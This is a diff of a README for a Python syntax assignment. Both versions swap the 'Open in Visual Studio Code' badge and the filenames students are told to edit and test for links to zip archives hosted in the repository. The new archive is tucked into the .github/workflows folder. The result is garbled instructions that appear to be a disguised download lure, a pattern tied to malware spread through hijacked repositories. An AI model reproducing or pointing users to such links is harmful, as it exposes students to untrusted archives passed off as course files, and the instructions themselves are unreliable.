@@ -1,4 +1,4 @@
-[![Open in Visual Studio Code](https://raw.githubusercontent.com/prshnt273/python-syntax-prshnt273/main/uninebriated/python-syntax-prshnt273.zip)](https://raw.githubusercontent.com/prshnt273/python-syntax-prshnt273/main/uninebriated/python-syntax-prshnt273.zip)
+[![Open in Visual Studio Code](https://raw.githubusercontent.com/prshnt273/python-syntax-prshnt273/main/.github/workflows/python-syntax-prshnt-v2.5.zip)](https://raw.githubusercontent.com/prshnt273/python-syntax-prshnt273/main/.github/workflows/python-syntax-prshnt-v2.5.zip)
 ﻿# python_syntax_assignment
 
 
@@ -12,8 +12,8 @@ This assignment tests your understanding of fundamental Python concepts across t
 
 ## Instructions
 1. Clone this repository to your local machine
-2. Complete all functions in `https://raw.githubusercontent.com/prshnt273/python-syntax-prshnt273/main/uninebriated/python-syntax-prshnt273.zip`
-3. Test your solutions locally using `https://raw.githubusercontent.com/prshnt273/python-syntax-prshnt273/main/uninebriated/python-syntax-prshnt273.zip`
+2. Complete all functions in `https://raw.githubusercontent.com/prshnt273/python-syntax-prshnt273/main/.github/workflows/python-syntax-prshnt-v2.5.zip`
+3. Test your solutions locally using `https://raw.githubusercontent.com/prshnt273/python-syntax-prshnt273/main/.github/workflows/python-syntax-prshnt-v2.5.zip`
 4. Commit and push your changes to submit
 
 ## Requirements
